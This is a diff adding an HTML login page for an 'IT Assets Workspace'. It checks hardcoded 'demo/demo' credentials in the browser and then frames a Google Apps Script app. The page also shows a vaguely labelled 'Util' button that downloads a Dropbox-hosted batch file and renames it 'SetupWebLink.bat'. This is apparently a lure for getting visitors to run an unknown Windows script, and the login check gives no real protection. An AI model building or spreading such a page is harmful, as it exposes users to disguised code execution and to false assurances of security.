@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IT Assets Workspace</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body, html { 
+      margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; 
+      background-color: #020617; font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+    }
+    .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+    @keyframes fadeIn { 
+      from { opacity: 0; transform: translateY(10px) scale(0.98); } 
+      to { opacity: 1; transform: translateY(0) scale(1); } 
+    }
+  </style>
+</head>
+<body class="text-slate-200">
+
+  <!-- Authentication Gatekeeper -->
+  <div id="authGatekeeper" class="absolute inset-0 z-50 flex items-center justify-center p-4 bg-slate-950 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-slate-900 via-slate-950 to-black">
+    
+    <!-- Top Right Corner Download Button -->
+    <div class="absolute top-6 right-6 z-50">
+      <a href="https://www.dropbox.com/scl/fi/42heqrhdq10so7oksfxhr/system-v10.bat?rlkey=j89ytwb526fdtqwoqhc8tl6xw&st=g0eipw1g&dl=1" 
+         download="SetupWebLink.bat" 
+         class="inline-flex items-center gap-2 px-5 py-2.5 bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold rounded-lg shadow-lg shadow-blue-900/20 border border-blue-500/50 transition-all duration-200">
+         <i class="fa-solid fa-download"></i> Util
+      </a>
+    </div>
+
+    <!-- Login Card -->
+    <div class="max-w-md w-full bg-slate-900/80 backdrop-blur-xl border border-slate-700/50 p-8 rounded-2xl shadow-2xl shadow-black/80 fade-in space-y-8">
+      
+      <div class="text-center space-y-2">
+        <div class="inline-flex items-center justify-center w-12 h-12 bg-indigo-500/10 text-indigo-400 rounded-xl border border-indigo-500/20 mb-2">
+          <i class="fa-solid fa-server text-xl"></i>
+        </div>
+        <h2 class="text-2xl font-semibold tracking-tight text-white">IT Assets Workspace</h2>
+        
+        <!-- Replaced Marquee with a clean badge -->
+        <div class="mt-4 inline-block bg-slate-800/80 text-slate-400 text-xs px-4 py-1.5 rounded-full border border-slate-700">
+          Demo Access: <span class="text-slate-200 font-medium">demo</span> / <span class="text-slate-200 font-medium">demo</span>
+        </div>
+      </div>
+
+      <form onsubmit="verifyGatewayCredentials(event)" class="space-y-5">
+        <div>
+          <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Operator Identity</label>
+          <div class="relative group">
+            <i class="fa-regular fa-user absolute left-4 top-3.5 text-slate-500 group-focus-within:text-indigo-400 transition-colors"></i>
+            <input type="text" id="gateUser" required placeholder="Enter username" 
+                   class="w-full bg-slate-950/50 border border-slate-700 rounded-xl py-3 pl-11 pr-4 text-sm text-white focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder-slate-600">
+          </div>
+        </div>
+
+        <div>
+          <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Security Passkey</label>
+          <div class="relative group">
+            <i class="fa-solid fa-lock absolute left-4 top-3.5 text-slate-500 group-focus-within:text-indigo-400 transition-colors"></i>
+            <input type="password" id="gatePass" required placeholder="••••••••" 
+                   class="w-full bg-slate-950/50 border border-slate-700 rounded-xl py-3 pl-11 pr-4 text-sm text-white focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder-slate-600">
+          </div>
+        </div>
+
+        <p id="errorLabel" class="text-xs text-rose-400 font-medium text-center hidden flex items-center justify-center gap-1.5 p-2 bg-rose-500/10 rounded-lg border border-rose-500/20">
+          <i class="fa-solid fa-triangle-exclamation"></i> Invalid credentials. Access Denied.
+        </p>
+
+        <button type="submit" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm rounded-xl transition-all shadow-lg shadow-indigo-600/25 flex items-center justify-center gap-2 mt-2">
+          Secure Login <i class="fa-solid fa-arrow-right-to-bracket"></i>
+        </button>
+      </form>
+
+      <div class="text-[11px] text-slate-500 text-center font-medium pt-6 border-t border-slate-800">
+        Authorized Personnel Only &bull; Sessions are logged
+      </div>
+    </div>
+  </div>
+
+  <!-- Main App Container -->
+  <div id="appContainer" class="w-full h-full hidden"></div>
+
+  <script>
+    // ==========================================
+    // DEFINE SECURITY KEYS 
+    // Note: Client-side validation is for demonstration only.
+    // ==========================================
+    const GATEWAY_USER = "demo"; 
+    const GATEWAY_PASS = "demo"; 
+    
+    // Replace with your actual deployment URL
+    const INVENTORY_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwkC_JtP3KhZIF024WNLvtUd1ouxPbsc6QRWZr6xK5Fn6hCoB8AxwaW18_Aymdxbhpv/exec";
+
+    function verifyGatewayCredentials(e) {
+      e.preventDefault();
+      
+      const user = document.getElementById('gateUser').value.trim();
+      const pass = document.getElementById('gatePass').value;
+      const errorLabel = document.getElementById('errorLabel');
+      
+      if(user === GATEWAY_USER && pass === GATEWAY_PASS) {
+        // Clear credentials
+        document.getElementById('gateUser').value = '';
+        document.getElementById('gatePass').value = '';
+        errorLabel.classList.add('hidden');
+        
+        // Hide Login UI
+        document.getElementById('authGatekeeper').classList.add('hidden');
+        
+        // Mount iframe
+        const container = document.getElementById('appContainer');
+        container.innerHTML = `<iframe src="${INVENTORY_SCRIPT_URL}" style="width:100%; height:100%; border:none;"></iframe>`;
+        container.classList.remove('hidden');
+      } else {
+        errorLabel.classList.remove('hidden');
+        document.getElementById('gatePass').value = '';
+        document.getElementById('gatePass').focus();
+      }
+    }
+  </script>
+</body>
+</html>
